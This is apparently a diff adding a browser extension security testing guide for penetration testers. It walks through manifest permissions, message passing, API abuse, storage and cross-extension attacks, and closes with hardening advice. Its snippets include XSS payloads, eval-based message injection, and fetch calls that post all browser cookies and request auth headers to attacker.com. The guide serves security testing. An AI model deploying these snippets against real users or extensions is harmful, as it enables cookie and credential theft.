@@ -1,0 +1,189 @@
+<browser_extension_security_guide>
+<title>BROWSER EXTENSION SECURITY</title>
+
+<critical>Browser extensions have elevated privileges: content script injection, message passing, storage access, and API access. Test content script injection points, message passing vulnerabilities, extension API abuse, storage access exploitation, cross-extension attacks, and background script vulnerabilities.</critical>
+
+<scope>
+- Content script injection points and CSP bypass
+- Message passing vulnerabilities (content ↔ background)
+- Extension API abuse (tabs, cookies, webRequest)
+- Storage access exploitation (chrome.storage)
+- Cross-extension communication attacks
+- Background script vulnerabilities
+- Manifest permissions analysis
+- Update mechanism vulnerabilities
+</scope>
+
+<methodology>
+1. Extract extension: chrome://extensions → Developer mode → Load unpacked
+2. Analyze manifest.json: permissions, content_scripts, background
+3. Test content scripts: injection points, message passing
+4. Test message passing: authorization, input validation
+5. Test API abuse: overreach permissions
+6. Test storage: sensitive data leakage
+7. Test cross-extension: enumerate other extensions
+8. Test XSS: escalate via extension context
+</methodology>
+
+<content_script_injection>
+<injection_points>
+// manifest.json
+"content_scripts": [{
+    "matches": ["<all_urls>"],  // injected everywhere
+    "js": ["content.js"]
+}]
+
+// content.js can access page DOM
+document.getElementById('password').value  // steal passwords
+</injection_points>
+
+<dom_xss_in_extension>
+// content.js
+const userInput = location.hash.substr(1);
+document.getElementById('output').innerHTML = userInput;  // XSS
+
+Attack: https://example.com/#<img src=x onerror=alert(1)>
+</dom_xss_in_extension>
+</content_script_injection>
+
+<message_passing_vulns>
+<unauthenticated_messages>
+// background.js
+chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
+    if (msg.action === 'executeSensitive') {
+        performSensitive();  // no sender validation
+    }
+});
+
+// Any page can send
+chrome.runtime.sendMessage(extensionId, {action: 'executeSensitive'});
+</unauthenticated_messages>
+
+<message_injection>
+// background.js trusts content script
+chrome.runtime.onMessage.addListener((msg) => {
+    eval(msg.code);  // RCE in extension context
+});
+
+// Attacker-controlled page
+chrome.runtime.sendMessage(extensionId, {code: 'alert(document.cookie)'});
+</message_injection>
+</message_passing_vulns>
+
+<extension_api_abuse>
+<tabs_api>
+// With "tabs" permission
+chrome.tabs.query({}, tabs => {
+    tabs.forEach(tab => {
+        // Access all tab URLs, inject scripts
+        chrome.tabs.executeScript(tab.id, {code: 'alert(document.cookie)'});
+    });
+});
+</tabs_api>
+
+<cookies_api>
+// With "cookies" permission
+chrome.cookies.getAll({}, cookies => {
+    // Exfiltrate all browser cookies
+    fetch('http://attacker.com/log', {
+        method: 'POST',
+        body: JSON.stringify(cookies)
+    });
+});
+</cookies_api>
+
+<webrequest_api>
+// With "webRequest" permission
+chrome.webRequest.onBeforeSendHeaders.addListener(
+    details => {
+        // Steal auth headers from all requests
+        fetch('http://attacker.com/log', {
+            method: 'POST',
+            body: JSON.stringify(details.requestHeaders)
+        });
+    },
+    {urls: ["<all_urls>"]},
+    ["requestHeaders"]
+);
+</webrequest_api>
+</extension_api_abuse>
+
+<storage_exploitation>
+<sensitive_data>
+// Check chrome.storage for secrets
+chrome.storage.local.get(null, data => {
+    console.log(data);  // API keys, tokens, user data
+});
+
+// Stored: {apiKey: 'secret', token: 'jwt'}
+</sensitive_data>
+
+<storage_injection>
+// Extension trusts storage
+chrome.storage.local.get('config', data => {
+    eval(data.config.script);  // if attacker can set storage
+});
+
+// Malicious extension or XSS
+chrome.storage.local.set({config: {script: 'malicious()'}});
+</storage_injection>
+</storage_exploitation>
+
+<cross_extension_attacks>
+<extension_enumeration>
+// Enumerate installed extensions
+const commonExtensionIds = ['aapbdbdomjkkjkaonfhkkikfgjllcleb', ...];
+commonExtensionIds.forEach(id => {
+    chrome.runtime.sendMessage(id, {ping: true}, response => {
+        if (response) console.log(`Found extension: ${id}`);
+    });
+});
+</extension_enumeration>
+
+<message_hijacking>
+// Extension A listens for messages
+chrome.runtime.onMessageExternal.addListener((msg, sender) => {
+    if (msg.action === 'getData') {
+        return {data: sensitiveData};  // no authorization
+    }
+});
+
+// Extension B (malicious) requests
+chrome.runtime.sendMessage(targetExtensionId, {action: 'getData'});
+</message_hijacking>
+</cross_extension_attacks>
+
+<validation>
+1. Extract extension source: chrome://extensions, Load unpacked
+2. Analyze manifest.json: permissions (tabs, cookies, <all_urls>)
+3. Test message passing: send unauthorized messages
+4. Test content script: XSS, data exfiltration
+5. Test storage: sensitive data, injection points
+6. Test API abuse: enumerate tabs, steal cookies
+7. Demonstrate impact: credential theft, API abuse, XSS escalation
+</validation>
+
+<impact>
+- Credential theft (cookies, storage, forms)
+- Cross-site scripting in extension context
+- API abuse (tabs, cookies, webRequest)
+- Cross-extension data theft
+- Man-in-the-middle (webRequest modification)
+- Sensitive data exfiltration from storage
+</impact>
+
+<pro_tips>
+1. Check manifest.json permissions first—overly broad is suspicious
+2. "<all_urls>" permission extremely powerful—grants universal access
+3. Test message passing with chrome.runtime.sendMessage from any page
+4. Content scripts have access to page DOM—can steal form data
+5. Background scripts persist—check for data exfiltration loops
+6. chrome.storage not encrypted—secrets stored in plaintext
+7. Extension IDs are predictable—enumerate common extensions
+8. webRequest API enables MITM of all browser traffic
+9. externally_connectable in manifest allows which sites to message extension
+10. Look for eval(), innerHTML in extension code—XSS vectors
+</pro_tips>
+
+<remember>Secure extensions require: minimal permissions, message sender validation, no eval/innerHTML, encrypted storage for secrets, CSP enforcement, and careful API usage. Extensions with "tabs", "cookies", or "<all_urls>" are high-value targets.</remember>
+</browser_extension_security_guide>
